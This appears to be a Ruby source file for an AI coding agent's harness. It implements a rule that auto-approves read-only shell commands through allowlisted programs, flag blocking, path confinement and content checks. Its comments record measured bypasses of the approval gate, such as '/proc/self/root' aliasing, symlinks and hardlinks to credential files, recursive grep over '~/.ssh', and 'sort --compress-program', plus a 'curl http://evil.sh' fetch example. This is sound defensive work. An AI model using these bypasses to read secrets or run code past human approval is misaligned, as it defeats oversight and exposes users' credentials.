# frozen_string_literal: true

require "pathname"

module Lain
  module Approval
    # The one rule in `lib/` that can APPROVE a shell command with no human and
    # no LLM anywhere in the loop.
    #
    # It reads the PARSED TERM rather than the model's string -- the door
    # {Rule::Call#term} opened, and the only thing in `lib/` that walks through
    # it. `cat README.md | head -20` stops costing a round trip to a person;
    # {#decide} answers nil for anything else, so the ladder runs on unchanged.
    #
    # == A conjunction of independent predicates, and that shape is the point
    #
    # Every one holds, or the rule says nothing:
    #
    # 1. the tool is the one whose input is a shell command;
    # 2. the verdict ALLOWS, so a term exists to read at all;
    # 3. every stage's argv0 is a BARE NAME, and every one is on {PROGRAMS};
    # 4. every word of every stage classifies ORDINARY, and not by exemption;
    # 5. no stage carries a flag that takes it outside its own arguments;
    # 6. no word traverses a path-aliasing pseudo-filesystem;
    # 7. THE ROOT PREDICATE: every word, and the call's own cwd, lands under
    #    the project root -- as written, and as the filesystem resolves it;
    # 8. THE CONTENT PREDICATE: no word names a file closed to other users, or
    #    one whose first bytes carry a region a masked read would withhold.
    # 9. THE LANDING PREDICATE: every word classifies ordinary where it LANDS,
    #    and not by exemption -- predicate 4 judges the name that was written,
    #    and a name can point at a file with a different one.
    #
    # {#approvable?} is the whole conjunction on one line and every predicate is
    # total over a term on its own, so another is one more `&&` plus one more
    # method. That is not tidiness, and it has been TESTED rather than claimed:
    # predicates 6, 7, 8 and 9 were each added after the rest shipped, and each
    # cost one `&&` and one method here -- two for 9, which needs a rescue of
    # its own -- and no existing predicate's logic changed.
    # Predicates 7 and 8 also each cost a message on the injected factory
    # (`#confinement`, `#content`), and 7 the lexical test it shares with
    # {Risk::OutsideRoot}, extracted as {Risk::Root}. The `PATH`-trust rung
    # ("the program `execvp` finds is under a trusted prefix") is still above
    # this one, and bolts on the same way.
    #
    # == Predicate 6: a path can be spelled so the classifier cannot see it
    #
    # `/proc/self/root` aliases `/`, and {Sensitivity} is LEXICAL, so a path
    # wearing that prefix stops matching every home-anchored rule --
    # `descends?(path, home)` is simply false. MEASURED through the real ladder:
    # `cat /proc/self/root<HOME>/.kube/config` was APPROVED while the plain
    # absolute spelling denied at triage. No attacker-planted file, every Linux
    # box, a pure string the model emits. {ALIASING} carries the mechanics.
    #
    # It does NOT belong in the classifier, and that was checked rather than
    # assumed: that path's basename is `config`, so no `Rule.within("proc",
    # name: ...)` can reach it, and a real classifier fix means resolving before
    # classifying -- filesystem access, a TOCTOU window, and the design the plan
    # defers. Refusing the WORD needs none of that.
    #
    # == The root predicate: automatic approval reads inside the project
    #
    # MEASURED before it existed: `.pgpass`, `grep TOKEN .bash_history` and
    # `/var/log/auth.log` were each approved with nobody asked, because the
    # classifier names credential SHAPES and no table of shapes is a boundary.
    #
    # WHAT IT GUARANTEES: at the moment of the decision, every word of the term
    # and the call's cwd land under the root twice over -- lexically under the
    # root as the session spells it, and, after `File.realpath` of the longest
    # prefix on disk, under the root's own real path. A
    # symlink in the checkout (`h -> $HOME`, `link -> /`), a dangling link, and
    # a `link/..` that climbs from the target all refuse, and so does anything
    # that cannot be resolved. It does NOT survive a link created between the
    # decision and the exec; no allowlisted program creates one.
    #
    # Every word is checked, not only the path-shaped ones, because a bare `..`
    # climbs out with no separator in it; a grep pattern that happens to read
    # as an absolute path is refused too, which costs a prompt. A session whose
    # root holds `$HOME`, or was never detected, confines nothing at all --
    # {CLI::Wiring::BoardBuild.confinement} says why.
    #
    # The real-path half lives HERE and not in {Sensitivity}: this rule
    # authorizes an exec that follows links, while the classifier's contract is
    # that it makes no syscall. The classifier alone still reads
    # `h/.config/gh/hosts.yml` as ordinary.
    #
    # == The content predicate: a name is not what a file holds
    #
    # MEASURED before it existed: a PKCS#8 key in `ops_readme.txt`, a hardlink
    # to a key in `~/.ssh`, a 0600 `deploy_key` and `.vault-token` were each
    # printed to the model with nobody asked, while `read_file` of the same
    # bytes masked them. Predicate 4 can only ever judge the name. So an
    # existing regular file must be readable by everyone, fit the bounded scan
    # (64 KiB), and carry no region; {CLI::Wiring::BoardBuild::Classifiers::Content}
    # holds the mechanics. It too lives outside {Sensitivity}, for the same
    # reason.
    #
    # == The landing predicate: a name is not what the kernel opens either
    #
    # MEASURED before it existed, in a project holding a `.env` and an `id_rsa`:
    # `cat notes.txt` and `cat changelog.txt`, two ordinary-named symlinks to
    # them INSIDE the root, were both approved with nobody asked -- the second
    # from the DENIED tier -- while the direct spelling of each refused.
    # Predicate 7 asks only WHERE a word lands and both landed inside; predicate
    # 8 asks what the bytes hold and a config file holds no key-shaped region;
    # predicate 4 classifies the word `notes.txt`, which is ordinary. Nothing in
    # the conjunction classified the name the kernel would actually open.
    #
    # So this one classifies the LANDING, through the classifier predicate 4
    # already built and the confinement predicate 7 already resolved: no new
    # message on the factory and no syscall class this call was not making. It
    # did cost one reader on the confinement -- `#real_landing`, which is the
    # resolution predicate 7 performs anyway and used to discard.
    # The resolving stays HERE for predicate 7's reason, and that reason is now
    # load-bearing twice: the classifier's whole contract is that it makes no
    # syscall, so the CALLER that authorizes a link-following exec is what has
    # to resolve before it asks.
    #
    # It classifies TWO spellings of that landing, because a project reached
    # through a link has two spellings of its own ROOT and a `/`-anchored config
    # rule is written against the one the session uses. The kernel's absolute
    # spelling is what catches a link whose target the session's own root names;
    # the same landing RELATIVE to where the command will run, which the
    # classifier resolves against the session's root, is what catches the file a
    # project rule names when the root itself is spelled through a link. Either
    # spelling being gated, denied, unreadable or exempt is a refusal.
    #
    # == What it does not cover, MEASURED rather than reasoned about
    #
    # A **hardlink**. `File.link($root/.env, $root/hard.txt)` and then
    # `cat hard.txt` is APPROVED -- measured, `nlink` 2 and the same inode.
    # `realpath` sees nothing to resolve, because a hardlink is a second name
    # for the inode rather than a path to follow, so this predicate reads an
    # ordinary name landing on an ordinary name. Predicate 8 is what catches the
    # case that motivated it, a hardlink to a KEY, and it catches it by the
    # bytes; a hardlink to a file gated only by its NAME survives both. Closing
    # it means comparing inodes against every gated name a directory holds,
    # which is a different mechanism from classifying a path.
    #
    # A `/`-anchored config rule naming a link INSIDE the root. With
    # `gated = ["/vault/"]` and `vault -> store`, `cat vault/secret.txt` refuses
    # at predicate 4 and `cat store/secret.txt` is APPROVED -- measured, and
    # true before this predicate existed too. Resolution deletes a link from
    # every landing, so a rule written against one matches no spelling of it: a
    # config has to name the real directory to bind, and `gated = ["/store/"]`
    # then refuses both spellings. The two spellings here are the root's, not
    # one per link on the path -- a path crossing several has a spelling for
    # each subset of them, which is not a set anything can classify.
    #
    # It also cannot save a word whose landing does not exist: a dangling link
    # has none, so {#ordinary_landing?} answers false rather than raising, which
    # is the direction predicate 7 already fails in.
    #
    # == Predicate 4 is "is ORDINARY", never "is not denied"
    #
    # {Sensitivity} is THREE-valued, and the GATED tier is where this codebase
    # put the credential files it declined to hard-refuse -- `.env`, `*.pem`,
    # `credentials.json`, `.git-credentials`, `terraform.tfstate`. Its header
    # says why: *"A spurious match here costs one prompt, so these are the half
    # that widens."* Measured, all five reach `allow`, so "not denied" approves
    # every one. Requiring `ordinary` also catches `Sensitivity::MALFORMED`, so
    # a word the classifier could not READ cannot pass as un-denied.
    #
    # An ordinary verdict whose reason is `exempt` does not count. The
    # `sensitivity exempt:` key tells a HUMAN's prompt that one file is not
    # worth asking about; it lifts the prompt, never this approval. Measured,
    # one basename exemption for a fixture `.env` approved `cat` of every
    # `.env` in the tree with nobody asked.
    #
    # And it classifies EVERY word itself, whatever the spelling.
    # {Escalation::Triage::Command} DOWNGRADES a denied word with no separator
    # from deny to abstain -- measured, `cat .netrc` abstains where
    # `cat ./.netrc` denies -- because "the call still reaches a human because
    # Triage downgrades every allow anyway". This rule destroys that premise, so
    # it cannot lean on it: Triage running first is ordering, and ordering is
    # not the safety property.
    #
    # == Predicate 5 exists because the check is over the TERM and the hazard is
    # over the READ SET
    #
    # They coincide only for programs whose read set is exactly their literal
    # arguments. MEASURED: `grep -h -r . /home/u/.ssh` reaches `allow` with EVERY
    # word classifying ordinary, the directory included -- the denied rule names
    # `id_*` INSIDE `.ssh` and the directory itself is not a match. It prints a
    # private key, which {Escalation::Triage} records nothing lifts: not a
    # policy, not `/mode auto`, not `ApproveAll`, not `sensitivity exempt:`.
    # Predicate 4 cannot save it. So each entry carries the flags that
    # disqualify it, and a stage naming one is refused. (The `~/.ssh` spelling of
    # the same command abstains earlier, at the parser, because a leading `~`
    # expands -- which is the parser's accident and not a second guard.)
    #
    # == A BARE name only, and this is the opposite of the exclusion set
    #
    # `Shell::Doubts#programs` BASENAMES, which is correct for a denylist:
    # `/usr/bin/curl` must not evade an exclusion of `curl`. Run the same
    # matching against an allowlist and `/tmp/evil/cat README.md` basenames to
    # an entry here and is approved with no human -- an attacker-planted binary.
    # So argv0 is compared whole, and a `/` anywhere in it disqualifies.
    #
    # == Where this stands, which is a rung and not an answer
    #
    # The governing principle this chunk was planned around: auto-approval must
    # never be more permissive than a careful human reading the same command
    # string, and that is a FLOOR rather than a target. A qualified argv0 is
    # refused under it; `PATH` is not checked, so this rule starts by inheriting
    # whatever trust the string itself invites. That is a statement of where the
    # implementation stands and never an argument for staying there.
    #
    # A PROGRAM NAME IS NOT AN IDENTITY. `PATH` is inherited and uncontrolled --
    # `WorkerEnv` merges onto the environment rather than clearing it, and
    # `Exec.child_env` scrubs only bundler variables -- and no rung here asks
    # whether the thing `execvp` finds is the program this list vouched for.
    # Resolving argv0 and journalling the absolute path is the next rung, and it
    # changes no decision.
    class ComposedTerm < Rule
      # Named rather than sniffed, on {Escalation::Triage::COMMAND_TOOLS}'
      # precedent -- a different rule from that list, not a copy of it. A
      # command tool holding no {Shell::Verdict} has no term to offer and hands
      # its backend the model's String either way, so approving one would
      # approve an `sh -c`; only a tool that really parses belongs here.
      TOOL = "bash"

      APPROVED = "every stage is a bare allowlisted reader over ordinary words: %<programs>s"

      # The pseudo-filesystems whose entries ALIAS another path. `/proc/self/root`
      # is `/`, `/proc/self/cwd` is the working directory, `/proc/self/fd/N` and
      # `/dev/fd/N` are whatever that descriptor holds, and `/sys` exposes the
      # kernel's own view. Matched as a path SEGMENT rather than a prefix, so a
      # relative spelling from a cwd at or above the root (`proc/self/root/...`),
      # a doubled separator (`//proc/...`) and a climb (`../proc/...`) are all
      # caught -- MEASURED, all three.
      #
      # `/dev` at large is NOT here; only `dev/fd`. `/dev/stdin` and
      # `/etc/shadow` are the root predicate's to refuse, since both lie
      # outside any project, and folding them in here would be a tier change on
      # an unmeasured argument.
      #
      # It over-refuses a checkout holding a `proc`, `sys` or `dev/fd`
      # directory. One prompt, failing closed -- the same bargain the
      # classifier's own `within("proc")` entry makes.
      #
      # == Variants that look like gaps and are not, RECORDED so nobody "fixes" them
      #
      # `/PROC`, `/Proc`, `/proc.` and `/proc%2f` all pass this regex. Each was
      # checked with `test -e` ON THIS PLATFORM and none exists: procfs is
      # case-sensitive, and nothing percent-decodes because the term arm starts
      # no shell. They are unreachable paths rather than bypasses -- a
      # measurement on Linux here, NOT a claim about every platform, and worth
      # re-running rather than assuming if that ever changes.
      #
      # The reason to write it down: an auditor will find these variants, and
      # without this note will either re-derive the measurement or close them by
      # matching case-insensitively and percent-decoding -- which widens what
      # this predicate refuses on an argument nobody checked.
      ALIASING = %r{(\A|/)(proc|sys|dev/fd)(/|\z)}

      SEPARATOR = "/"
      LONG = "--"
      DASH = "-"

      Flags = Data.define(:short, :long)

      # The flags that disqualify a stage naming one allowlisted program: the
      # SHORT letters and the LONG names the real binary accepts. Named for the
      # one thing it holds -- an empty one says "no flag disqualifies this
      # program", where a class called `Program` read it as "an empty program".
      # Reopened rather than written in the `Data.define` block, where a
      # constant would scope to {Approval} instead.
      #
      # == The matcher is deliberately blunter than getopt
      #
      # Four evasions were measured against the real binaries, and all four are
      # closed by scanning characters rather than parsing options:
      # `sort -ro/tmp/out` wrote through a BUNDLED, ATTACHED `-o`; `grep -hr`
      # recursed; `wc --f=names.nul` read a name list through an ABBREVIATED
      # long option, GNU `getopt_long` taking any unambiguous prefix; and
      # `grep --exclude-from=/etc/passwd` opened a file by EXTENDING a listed
      # flag rather than abbreviating one.
      #
      # So a short word disqualifies when ANY of its characters is a
      # disqualifying letter, and a long word when it is a prefix of a
      # disqualifying name OR a disqualifying name is a prefix of IT. The
      # matcher runs BOTH ways, because a one-way one is only as good as the
      # direction somebody thought to test -- and the direction nobody tested
      # was the one that auto-approved a file read.
      #
      # It over-refuses, and every over-refusal was MEASURED rather than
      # predicted: `sort -to in` abstains where `sort -t o in` is approved,
      # `grep -e -r lib` abstains where `grep -e foo lib` is approved,
      # `grep -- -r lib` abstains because every word is scanned, and both
      # `grep --files-with-matches` and `grep --files-without-match` -- the
      # harmless `-l` and `-L` -- abstain because each extends the listed
      # `--file`. The LONG spelling only: `grep -l` and `grep -L` still approve,
      # because the short matcher is per-character and neither letter
      # disqualifies. That is the right way to be wrong: a
      # refusal costs one prompt, and until this rule existed every one of these
      # commands cost that prompt anyway.
      class Flags
        # @param short [Array<String>] the disqualifying single letters
        # @param long [Array<String>] the disqualifying long options, `--` included
        def initialize(short: [], long: [])
          super(short: short.map(&:-@).freeze, long: long.map(&:-@).freeze)
        end

        def admits?(arguments) = arguments.none? { |word| disqualifies?(word) }

        private

        def disqualifies?(word)
          # The end-of-options marker is not an option. Every word is scanned
          # whether it follows one or not, which refuses `grep -- -r` and is
          # cheaper to be sure of than a positional state machine.
          return false if word == LONG
          return extends_or_abbreviates?(word.split("=", 2).first) if word.start_with?(LONG)
          return word.delete_prefix(DASH).chars.intersect?(short) if word.start_with?(DASH)

          false
        end

        # Symmetric, deliberately. `flag.start_with?(written)` alone catches
        # `--rec` for `--recursive` and MISSES `--exclude-from` for `--exclude`.
        def extends_or_abbreviates?(written)
          long.any? { |flag| flag.start_with?(written) || written.start_with?(flag) }
        end
      end

      # What an UNLISTED program's flags admit, which is nothing -- so
      # {#unflagged?} is total over a term on its own rather than depending on
      # {#allowlisted?} having run first. That independence is what let
      # predicate 6 be added as one `&&` and one method.
      class Unlisted
        def admits?(_arguments) = false
      end
      private_constant :Unlisted

      UNLISTED = Unlisted.new.freeze
      private_constant :UNLISTED

      # THE ALLOWLIST, derived from what each program does with the argv it is
      # GIVEN: reads only, writes nothing, fetches nothing, executes nothing.
      #
      # NOT `Shell::Pipeline::STDIN_SAFE`, which answers "safe under
      # attacker-chosen STDIN" and is applied to the stages AFTER the first.
      # Measured: `gzip`, `xz`, `zstd`, `sort` and `shuf` are all on that list,
      # and `gzip important.log`, `sort -o out in` and `curl http://evil.sh | cat`
      # all reach `allow` while replacing, overwriting and fetching.
      #
      # Every entry and every flag was read off the real binary's `--help`, and
      # the four hazards a program's reputation does not advertise were each RUN:
      # `sort --compress-program` executed a script of the caller's choosing,
      # `sort --files0-from` and `wc --files0-from` read files named in another
      # file (or on stdin), `sort --random-source` opened an arbitrary path, and
      # `tail -f` never returned. An empty entry is a claim somebody made after
      # reading the flags; there are no blanks.
      PROGRAMS = {
        # Reads exactly its arguments and writes nothing. Its whole option set
        # is display formatting.
        "cat" => Flags.new,
        # A prefix and a suffix of exactly their arguments. `tail` also FOLLOWS,
        # and `-f`/`-F` never return -- the read set is unchanged, so this is a
        # narrowing past predicate 5's letter: an auto-approved call that cannot
        # finish holds the tool for its whole timeout with nobody having chosen
        # that.
        "head" => Flags.new,
        "tail" => Flags.new(short: %w[f F], long: %w[--follow --retry]),
        # Counts and numbers exactly its arguments -- except that `wc` will take
        # the LIST of files to count from another file, or from stdin.
        "wc" => Flags.new(long: %w[--files0-from]),
        "nl" => Flags.new,
        # Reads exactly its arguments WHEN NOT RECURSING. `-d` is disqualified
        # whole rather than only at `-d recurse`, since the value is a separate
        # word and reading it would be parsing options.
        #
        # All three `--exclude*` spellings are NAMED. An earlier draft named
        # `--exclude` alone and claimed it "covers all three" -- false, and
        # measured false: the matcher ran one way, and
        # `grep --exclude-from=/etc/passwd` was approved. The matcher is
        # symmetric now, which closes the class; listing them is what makes the
        # TABLE true without a reader having to reason about prefix semantics.
        "grep" => Flags.new(short: %w[r R f d],
                            long: %w[--recursive --dereference-recursive --directories
                                     --include --exclude --exclude-dir --exclude-from --file]),
        # Reads its arguments -- and, flagged, writes, executes, and reads
        # elsewhere. The only entry that can run a program of the caller's
        # choosing, and the reason the flag half of every entry exists.
        "sort" => Flags.new(short: %w[o T],
                            long: %w[--output --compress-program --files0-from
                                     --random-source --temporary-directory]),
        # Pure transforms. `cut -O` is an output DELIMITER and not a file, which
        # is worth saying because it reads like `sort -o`. `tr` opens no file at
        # all; `rev` opens exactly its arguments.
        "cut" => Flags.new,
        "tr" => Flags.new,
        "rev" => Flags.new
      }.freeze

      # @param sensitivity [#call, #confinement, #content] `cwd -> #classify`, a
      #   {Sensitivity} FACTORY rather than one classifier: a bash call names its
      #   own working directory, and a classifier built at wiring time would
      #   anchor a relative word under whatever directory the agent started in --
      #   approving `cat config` from inside `.git`. Its `#confinement(cwd)`
      #   answers the root predicate from the same resolution of that cwd, so
      #   the two cannot disagree about where a relative word lands, and it must
      #   fail CLOSED where `#call` falls back. Its `#content(cwd)` answers the
      #   content predicate over that same resolution, and fails closed too.
      #
      #   REQUIRED, with no Null default, on the ladder's `faults:` precedent:
      #   a permissive default is how a guard ships green forever, and a rule
      #   that APPROVES, handed a classifier protecting nothing, would approve
      #   every path there is.
      #
      #   It must be TOTAL, for the security reason {Escalation::Triage} states
      #   at length about the same seam. Measured, the failure direction here is
      #   at least safe: a raise reaches {RuleChain} as a fault and a fault
      #   suppresses the allow (`Poisoned(decision: nil)`).
      def initialize(sensitivity:)
        super()
        @sensitivity = sensitivity
        freeze
      end

      # @param call [Rule::Call]
      # @return [Rule::Decision, nil] an allow, or nil for every other command
      def decide(call)
        # {Rule::Call#term?} IS predicate 2: a deny and every abstention carry
        # {Shell::Verdict::NO_TERM}, so "a term arrived" is "the verdict allowed"
        # -- and a session excluding a program makes that verdict a DENY, which
        # is how an exclusion outranks the allowlist without this rule knowing
        # the exclusion table exists.
        return nil unless judged?(call) && call.term?

        # One local, because {Rule::Call#term} re-parses on every ask.
        term = call.term
        return nil unless approvable?(term, call.input.cwd)

        allow(call, because: format(APPROVED, programs: programs(term).join(", ")))
      end

      private

      # THE CONJUNCTION. Each predicate is total over a term by itself, so the
      # order is short-circuiting for cost and for nothing else, and another
      # goes here plus one method below.
      def approvable?(term, cwd)
        bare_names?(term) && allowlisted?(term) && ordinary_words?(term, cwd) &&
          unflagged?(term) && unaliased?(term) && confined?(term, cwd) &&
          plain_content?(term, cwd) && resolved_words?(term, cwd)
      end

      def judged?(call) = call.tool_name == TOOL

      # Compared WHOLE and never basenamed. `Doubts#programs` basenames, which
      # is right for the exclusion set and would let `/tmp/evil/cat` match the
      # entry for `cat` here.
      def bare_names?(term) = programs(term).none? { |program| program.include?(SEPARATOR) }

      def allowlisted?(term) = programs(term).all? { |program| PROGRAMS.key?(program) }

      def ordinary_words?(term, cwd)
        classifier = @sensitivity.call(cwd)
        term.flatten.all? { |word| unexempted?(classifier.classify(word)) }
      end

      def unexempted?(verdict) = verdict.ordinary? && !verdict.exempt?

      def unflagged?(term)
        term.all? { |program, *arguments| PROGRAMS.fetch(program, UNLISTED).admits?(arguments) }
      end

      # Predicate 6, and the shape every later rung copies: one method over the
      # term alone, total by itself, reached by one more `&&` above.
      def unaliased?(term) = term.flatten.none? { |word| word.match?(ALIASING) }

      # The root predicate. The factory folds the call's own cwd into the
      # answer: a cwd outside the root confines nothing, so no word passes.
      def confined?(term, cwd)
        confinement = @sensitivity.confinement(cwd)
        term.flatten.all? { |word| confinement.contains?(word) }
      end

      # The content predicate. The only one that opens a file, and that is the
      # only reason for its place: the factory answers it over its own root
      # answer.
      def plain_content?(term, cwd)
        content = @sensitivity.content(cwd)
        term.flatten.all? { |word| content.admits?(word) }
      end

      # The landing predicate. Predicate 4 classified the word as written; this
      # classifies what it resolves to, so a link cannot carry a gated file in
      # under an ordinary name.
      def resolved_words?(term, cwd)
        classifier = @sensitivity.call(cwd)
        confinement = @sensitivity.confinement(cwd)
        term.flatten.all? { |word| ordinary_landing?(classifier, confinement, word) }
      end

      # Both spellings of the landing, for the reason the header gives, and
      # false for a word that resolves nowhere: `#landing_of` raises where no
      # prefix is on disk, and a raise here would reach {RuleChain} as a fault
      # rather than as the refusal it means.
      #
      # The base the relative spelling is measured from is the confinement's own
      # `#real_landing` -- one resolution per decision, which the factory had to
      # make anyway, rather than one per word.
      def ordinary_landing?(classifier, confinement, word)
        landing = confinement.landing_of(word)
        relative = Pathname.new(landing).relative_path_from(confinement.real_landing).to_s
        [landing, relative].all? { |spelling| unexempted?(classifier.classify(spelling)) }
      rescue StandardError
        false
      end

      def programs(term) = term.map(&:first)
    end
  end
end
